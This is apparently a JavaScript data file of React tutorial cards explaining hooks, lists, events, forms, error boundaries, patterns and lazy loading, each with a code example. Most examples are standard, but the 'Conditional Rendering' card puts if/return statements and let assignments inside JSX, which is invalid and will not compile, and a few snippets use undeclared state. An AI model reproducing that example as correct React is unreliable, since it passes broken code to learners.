  const [user, setUser] = useState(null);

  // Fetch on mount and when userId changes
  useEffect(() => {
    let cancelled = false;
    fetchUser(userId).then(data => {
      if (!cancelled) setUser(data);
    });
    return () => { cancelled = true; }; // cleanup
  }, [userId]);

  // Subscribe to event
  useEffect(() => {
    const handler = (e) => console.log('Resize', e);
    window.addEventListener('resize', handler);
    return () => window.removeEventListener('resize', handler);
  }, []);

  // Timer
  useEffect(() => {
    const id = setInterval(() => setCount(c => c + 1), 1000);
    return () => clearInterval(id);
  }, []);

  if (!user) return <Spinner />;
  return <div>{user.name}</div>;
}`
  },
  {
    title: 'useContext',
    category: 'React',
    subcategory: 'Hooks',
    description: 'Sharing data across the component tree without prop drilling.',
    content: 'useContext provides a way to pass data through the component tree without manually passing props at every level. Create a context with createContext, provide it with a Provider, consume it with useContext. Best for theme, auth, locale, and other global state. Don\'t overuse it — prop drilling is fine for 2-3 levels.',
    example: `import { createContext, useContext, useState } from 'react';

const ThemeContext = createContext();

function ThemeProvider({ children }) {
  const [theme, setTheme] = useState('dark');
  const toggle = () => setTheme(t => t === 'dark' ? 'light' : 'dark');
  return (
    <ThemeContext.Provider value={{ theme, toggle }}>
      {children}
    </ThemeContext.Provider>
  );
}

function ThemedButton() {
  const { theme, toggle } = useContext(ThemeContext);
  return (
    <button onClick={toggle}>
      Current: {theme}
    </button>
  );
}

// Usage (wrap at top level)
<ThemeProvider>
  <App />
</ThemeProvider>`
  },
  {
    title: 'useRef',
    category: 'React',
    subcategory: 'Hooks',
    description: 'Accessing DOM elements and persisting mutable values without re-renders.',
    content: 'useRef returns a mutable ref object (.current). Common uses: (1) Accessing DOM elements directly, (2) Storing values that don\'t trigger re-renders (previous values, timers, flags). Unlike useState, changing ref.current doesn\'t cause a re-render.',
    example: `import { useRef, useEffect } from 'react';

function TextInput() {
  const inputRef = useRef(null);

  const focus = () => inputRef.current.focus();

  return (
    <>
      <input ref={inputRef} type="text" />
      <button onClick={focus}>Focus</button>
    </>
  );
}

// Store previous value
function Counter() {
  const [count, setCount] = useState(0);
  const prevCount = useRef(count);

  useEffect(() => {
    prevCount.current = count;
  }, [count]);

  return <p>Now: {count}, Before: {prevCount.current}</p>;
}

// Store interval ID (no re-render)
function Timer() {
  const [time, setTime] = useState(0);
  const intervalRef = useRef(null);

  const start = () => {
    intervalRef.current = setInterval(() => setTime(t => t + 1), 1000);
  };
  const stop = () => clearInterval(intervalRef.current);
}`
  },
  {
    title: 'useMemo & useCallback',
    category: 'React',
    subcategory: 'Hooks',
    description: 'Performance optimization — memoizing values and functions.',
    content: 'useMemo caches a computed value between re-renders (skip expensive recalculations). useCallback caches a function reference (prevent child re-renders). Both depend on dependency arrays. Don\'t premature-optimize — only use when you have measurable performance issues or pass callbacks to memoized children.',
    example: `import { useMemo, useCallback } from 'react';

function ProductList({ products, filter }) {
  // useMemo — skip expensive filtering
  const filtered = useMemo(() => {
    return products.filter(p => p.price > filter.min);
  }, [products, filter.min]);

  // useCallback — stable function reference
  const handleSelect = useCallback((id) => {
    console.log('Selected:', id);
  }, []);

  return (
    <ul>
      {filtered.map(p => (
        <Product key={p.id} product={p} onSelect={handleSelect} />
      ))}
    </ul>
  );
}

// React.memo + useCallback combo
const Product = React.memo(({ product, onSelect }) => {
  // Only re-renders if product or onSelect changes
  return <li onClick={() => onSelect(product.id)}>{product.name}</li>;
});`
  },
  {
    title: 'Custom Hooks',
    category: 'React',
    subcategory: 'Hooks',
    description: 'Extracting reusable stateful logic into custom functions.',
    content: 'Custom hooks are functions that use other hooks. They let you extract component logic into reusable functions. Naming convention: use + descriptive name. They can return values, functions, or combinations. Same hook in different components maintains separate state.',
    example: `// Custom hook for API calls
function useFetch(url) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    setLoading(true);
    fetch(url)
      .then(res => res.json())
      .then(data => { setData(data); setLoading(false); })
      .catch(err => { setError(err); setLoading(false); });
  }, [url]);

  return { data, loading, error };
}

// Custom hook for localStorage
function useLocalStorage(key, initial) {
  const [value, setValue] = useState(() => {
    const saved = localStorage.getItem(key);
    return saved ? JSON.parse(saved) : initial;
  });

  useEffect(() => {
    localStorage.setItem(key, JSON.stringify(value));
  }, [key, value]);

  return [value, setValue];
}

// Usage
function App() {
  const { data, loading } = useFetch('/api/users');
  const [theme, setTheme] = useLocalStorage('theme', 'dark');
}`
  },
  {
    title: 'Lists & Keys',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Rendering collections efficiently with stable, unique keys.',
    content: 'Use map() to render arrays. Each element needs a unique key prop (prefer stable IDs over indices). Keys help React identify which items changed, were added, or removed. Bad keys cause rendering bugs and performance issues. Never use Math.random() as keys.',
    example: `function TodoList({ todos }) {
  return (
    <ul>
      {todos.map(todo => (
        <li key={todo.id}>
          {todo.text}
        </li>
      ))}
    </ul>
  );
}

// ❌ Bad keys
{items.map((item, i) => <li key={i}>...</li>)}  // index
{items.map(item => <li key={Math.random()}>...</li>)}  // random

// ✅ Good keys
{items.map(item => <li key={item.id}>...</li>)}  // stable ID
{items.map(item => <li key={item.slug}>...</li>)}  // unique property

// Filtering without losing state
const [filter, setFilter] = useState('all');
const filtered = todos.filter(t =>
  filter === 'all' ? true : t.done === (filter === 'done')
);`
  },
  {
    title: 'Event Handling',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Handling user interactions with synthetic events.',
    content: 'React wraps native events in SyntheticEvents for cross-browser consistency. Event handlers are camelCase (onClick, onChange). Pass the handler, don\'t call it. Access the event object in the handler. Use event.preventDefault() for form submission. Event delegation happens automatically in React.',
    example: `function Form() {
  const handleSubmit = (e) => {
    e.preventDefault();  // prevent page reload
    const data = new FormData(e.target);
    console.log(data.get('email'));
  };

  const handleChange = (e) => {
    console.log(e.target.name, e.target.value);
  };

  return (
    <form onSubmit={handleSubmit}>
      <input name="email" onChange={handleChange} />
      <input name="password" type="password" />
      <button type="submit">Submit</button>
    </form>
  );
}

// Event delegation
function List({ items }) {
  const handleClick = (e) => {
    // Single handler for all items
    const id = e.target.dataset.id;
    if (id) console.log('Clicked:', id);
  };

  return (
    <ul onClick={handleClick}>
      {items.map(i => <li key={i.id} data-id={i.id}>{i.name}</li>)}
    </ul>
  );
}`
  },
  {
    title: 'Conditional Rendering',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Showing/hiding UI elements based on state and props.',
    content: 'Multiple approaches: && operator (short-circuit), ternary operator (if/else), early return, if statements before return. Use the approach that reads most clearly. Avoid rendering null with && if the falsy value could be 0.',
    example: `function Dashboard({ user, notifications, isAdmin }) {
  // && operator
  return (
    <div>
      {user && <h1>Welcome, {user.name}</h1>}

      {/* Ternary */}
      {isAdmin ? <AdminPanel /> : <UserPanel />}

      {/* Avoid: && with 0 */}
      {notifications.length > 0 && <Badge count={notifications.length} />}

      {/* Early return for loading */}
      if (!user) return <Spinner />;

      {/* Variable assignment */}
      let content;
      if (isAdmin) content = <AdminView />;
      else if (user.premium) content = <PremiumView />;
      else content = <FreeView />;

      return <div>{content}</div>;
    </div>
  );
}`
  },
  {
    title: 'Forms in React',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Controlled vs uncontrolled components and form management.',
    content: 'Controlled components: React state is the single source of truth (value + onChange). Uncontrolled components: DOM holds the state (ref). Controlled gives full control, uncontrolled is simpler for quick forms. For complex forms, consider React Hook Form or Formik.',
    example: `// Controlled component
function ControlledForm() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    login(email, password);
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />
      <input
        type="password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />
      <button type="submit">Login</button>
    </form>
  );
}

// Uncontrolled with ref
function UncontrolledForm() {
  const emailRef = useRef();

  const handleSubmit = () => {
    console.log(emailRef.current.value);
  };

  return (
    <form onSubmit={handleSubmit}>
      <input ref={emailRef} type="email" defaultValue="" />
      <button type="submit">Login</button>
    </form>
  );
}`
  },
  {
    title: 'Error Boundaries',
    category: 'React',
    subcategory: 'Advanced',
    description: 'Catching JavaScript errors in the component tree gracefully.',
    content: 'Error boundaries are class components that catch errors in their child tree. They prevent the whole app from crashing. Use getDerivedStateFromError to update state, componentDidCatch for logging. Only class components can be error boundaries (no hook equivalent yet).',
    example: `class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }

  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }

  componentDidCatch(error, errorInfo) {
    logErrorToService(error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      return (
        <div className="error-fallback">
          <h2>Something went wrong</h2>
          <button onClick={() => this.setState({ hasError: false })}>
            Try again
          </button>
        </div>
      );
    }
    return this.props.children;
  }
}

// Usage
<ErrorBoundary>
  <Dashboard />
</ErrorBoundary>`
  },
  {
    title: 'React Patterns',
    category: 'React',
    subcategory: 'Advanced',
    description: 'Compound components, render props, HOCs, and container/presentational.',
    content: 'Common React patterns: Compound Components (Tabs, Accordion — implicit state sharing), Render Props (pass function as child), Higher-Order Components (withAuth, withTheme — wrap components), Container/Presentational (logic vs UI separation). Modern React favors custom hooks over HOCs and render props.',
    example: `// Compound Components
function Tabs({ children, defaultTab }) {
  const [active, setActive] = useState(defaultTab);
  return (
    <TabsContext.Provider value={{ active, setActive }}>
      {children}
    </TabsContext.Provider>
  );
}
Tabs.Panel = ({ label, children }) => {
  const { active, setActive } = useContext(TabsContext);
  return (
    <div>
      <button onClick={() => setActive(label)}>{label}</button>
      {active === label && children}
    </div>
  );
};

// Usage
<Tabs defaultTab="Home">
  <Tabs.Panel label="Home"><HomeContent /></Tabs.Panel>
  <Tabs.Panel label="Settings"><SettingsContent /></Tabs.Panel>
</Tabs>

// Custom hook pattern (modern replacement for HOCs)
function useAuth() {
  const { currentUser } = useContext(AuthContext);
  return currentUser;
}`
  },
  {
    title: 'Suspense & Lazy Loading',
    category: 'React',
    subcategory: 'Advanced',
    description: 'Code splitting and loading states with React Suspense.',
    content: 'React.lazy() dynamically imports a component (code splitting). Suspense shows a fallback while loading. Together they reduce initial bundle size. Error boundaries should wrap Suspense for error handling. Suspense also works with data fetching (React 18+).',
    example: `import { lazy, Suspense } from 'react';

// Lazy load heavy components
const Analytics = lazy(() => import('./pages/Analytics'));
const CodeLab = lazy(() => import('./pages/CodeLab'));

function App() {
  return (
    <Suspense fallback={<LoadingSpinner />}>
      <Routes>
        <Route path="/analytics" element={<Analytics />} />
        <Route path="/codelab" element={<CodeLab />} />
      </Routes>
    </Suspense>
  );
}

// With error boundary
<ErrorBoundary>
  <Suspense fallback={<Spinner />}>
    <HeavyComponent />
  </Suspense>
</ErrorBoundary>

// Named exports with lazy
const Dashboard = lazy(() =>
  import('./Dashboard').then(mod => ({ default: mod.Dashboard }))
);`
  },
  {
    title: 'React Hooks Rules',
    category: 'React',
    subcategory: 'Best Practices',
    description: 'Rules that must be followed for hooks to work correctly.',
    content: 'Two rules: (1) Only call hooks at the top level — never inside loops, conditions, or nested functions. (2) Only call hooks from React functions — components or custom hooks. These rules exist because hooks rely on call order to match state to hooks. The eslint-plugin-react-hooks enforces these.',
    example: `// ❌ WRONG — conditional hook
function Component({ show }) {
  if (show) {
    const [value, setValue] = useState('');  // ERROR!
  }
}

// ✅ RIGHT — always call hooks
function Component({ show }) {
  const [value, setValue] = useState('');
  // Use the value conditionally in JSX
  return show && <input value={value} />;
}

// ❌ WRONG — hook in callback
function Component() {
  useEffect(() => {
    const [local, setLocal] = useState(0);  // ERROR!
  }, []);
}

// ✅ RIGHT — custom hook
function useLocalStorage(key) {
  const [value, setValue] = useState(() =>
    JSON.parse(localStorage.getItem(key))
  );
  return [value, setValue];
}

// ESLint plugin enforces rules
// npm install eslint-plugin-react-hooks`
  },
];
